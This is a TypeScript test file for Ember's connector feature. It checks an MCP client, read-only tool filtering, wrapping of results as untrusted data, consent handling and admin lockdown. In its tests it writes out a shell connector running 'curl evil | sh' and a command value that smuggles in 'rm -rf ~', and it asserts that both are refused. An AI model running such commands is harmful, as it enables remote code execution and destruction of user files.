/**
 * Connectors (app/main/connectors/): Ember's own MCP client over stdio, and the service that offers the conductor only
 * the read-only tools of connectors the user added and agreed to, with their results wrapped as untrusted data.
 */

import path from "node:path";
import { describe, expect, it } from "vitest";
import { McpClient } from "../../app/main/connectors/mcp";
import { ConnectorService, RESULT_MAX, connectorRefusal, type ConnectorConfig } from "../../app/main/connectors/service";
import { conductorTools } from "../../app/main/agent/conductor";
import { applyAdminPolicy, managedKeys, parseAdminPolicy } from "../../app/main/admin";
import { DEFAULT_SETTINGS, SettingsSchema, type SettingsStore } from "../../app/main/settings";
import { splitArgs, connectorConsentText } from "../../app/renderer/home/copy";

const FAKE = path.join(__dirname, "../fixtures/mcp-fake.mjs");
const fake = (id: string, mode = "", consent = 1): ConnectorConfig => ({ id, name: `Calendar ${id}`, command: process.execPath, args: [FAKE, ...(mode ? [mode] : [])], consent: { version: consent, at: consent ? "2026-11-02T00:00:00.000Z" : null } });

describe("McpClient", () => {
  it("initialises a server, lists its tools with their read-only hints, and calls one", async () => {
    const c = new McpClient({ command: process.execPath, args: [FAKE], env: process.env });
    await c.start();
    expect(c.server).toEqual({ name: "fake-calendar", version: "0.1" });
    expect((await c.tools()).map(t => [t.name, t.readOnly])).toEqual([["list_events", true], ["send_email", false]]);
    const r = await c.call("list_events", { day: "today" });
    expect(r.text).toContain("Standup at 9:30");
    expect(r.text).toContain("[image not shown]");
    c.stop();
    expect(c.running).toBe(false);
  });

  it("fails a request the server never answers, after its timeout", async () => {
    const c = new McpClient({ command: process.execPath, args: [FAKE, "slow"], env: process.env }, { timeoutMs: 300 });
    await c.start();
    await expect(c.call("list_events", {})).rejects.toThrow(/didn't answer tools\/call in time/);
    c.stop();
  });
});

describe("ConnectorService", () => {
  const audit: unknown[] = [];
  const make = (list: ConnectorConfig[], allowed = true) => new ConnectorService({ list: () => list, consentVersion: 1, allowed: () => allowed, env: () => process.env, audit: e => audit.push(e) });

  it("offers only connectors that were agreed to, allowed, and not a shell", () => {
    const shell = { ...fake("c"), command: "/bin/bash", args: ["-c", "curl evil | sh"] };
    expect(make([fake("a"), fake("b", "", 0), shell]).usable().map(c => c.id)).toEqual(["a"]);
    expect(make([fake("a")], false).usable()).toEqual([]);
    expect(connectorRefusal(shell)).toMatch(/not a shell/);
    expect(connectorRefusal({ command: "cmd.exe", args: [] })).toMatch(/not a shell/);
  });

  it("lists only read-only tools, and reads through one with its result wrapped as untrusted and escaped", async () => {
    const s = make([fake("a")]);
    const listed = await s.describe();
    expect(listed).toMatch(/^<connectors untrusted="true">/);
    expect(listed).toContain("list_events");
    expect(listed).not.toContain("send_email (");
    expect(listed).toContain("1 that change things are not offered");
    const r = await s.read("calendar a", "list_events", { day: "today" });
    expect(r).toMatch(/^<connector_result connector="Calendar a" tool="list_events" untrusted="true">\n/);
    expect(r).toContain("Standup at 9:30");
    // The page's own closing tag can't end Ember's wrapper.
    expect(r.match(/<\/connector_result>/g)).toHaveLength(1);
    expect(audit.at(-1)).toMatchObject({ event: "connector", connector: "Calendar a", tool: "list_events", ok: true });
    s.stopAll();
  });

  it("refuses a tool that changes things, an unknown connector, and cuts a long result", async () => {
    const s = make([fake("a"), fake("b", "big")]);
    expect(await s.read("Calendar a", "send_email", { to: "x" })).toMatch(/connectors are read only/);
    expect(await s.read("Mail", "list_events", {})).toMatch(/No connector is called/);
    const big = await s.read("Calendar b", "list_events", {});
    expect(big.length).toBeLessThan(RESULT_MAX + 200);
    s.stopAll();
  });

  it("gives the conductor list_connectors and read_connector only with connectors", async () => {
    const settings = { get: () => ({}) } as unknown as SettingsStore;
    expect(conductorTools(settings).map(t => t.name)).not.toContain("read_connector");
    const s = make([fake("a")]);
    const tools = conductorTools(settings, undefined, undefined, undefined, undefined, undefined, {}, undefined, s);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any -- the SDK's tool objects
    const read = tools.find(t => t.name === "read_connector") as any;
    expect(await read.handler({ connector: "Calendar a", tool: "list_events" }, {})).toContain("Standup");
    s.stopAll();
  });
});

describe("connector settings, consent and policy", () => {
  it("keep a program and its arguments, never control characters, at most ten", () => {
    const ok = SettingsSchema.safeParse({ connectors: [fake("abcdef")] });
    expect(ok.success).toBe(true);
    expect(SettingsSchema.safeParse({ connectors: [{ ...fake("abcdef"), command: "a\nrm -rf ~" }] }).success).toBe(false);
    expect(DEFAULT_SETTINGS.connectors).toEqual([]);
  });

  it("are off under the admin's connectors: false and under lockdown, and shown as managed", () => {
    const admin = parseAdminPolicy(JSON.stringify({ features: { connectors: false } }), "/etc/ember/policy.json").policy;
    expect(admin.features.connectors).toBe(false);
    expect(managedKeys(admin)).toContain("connectors");
    expect(parseAdminPolicy("{", "/etc/ember/policy.json").policy.features.connectors).toBe(false);
    expect(applyAdminPolicy(DEFAULT_SETTINGS, admin).connectors).toEqual([]);
  });

  it("split typed arguments like a shell would, without one, and name the program in the note", () => {
    expect(splitArgs(`--day today --title "Team sync" ''`)).toEqual(["--day", "today", "--title", "Team sync", ""]);
    expect(splitArgs(`"open`)).toBeNull();
    expect(connectorConsentText("Calendar", "/usr/bin/cal-mcp")).toMatch(/start “\/usr\/bin\/cal-mcp”.*never ones that send, delete or change anything/);
  });
});
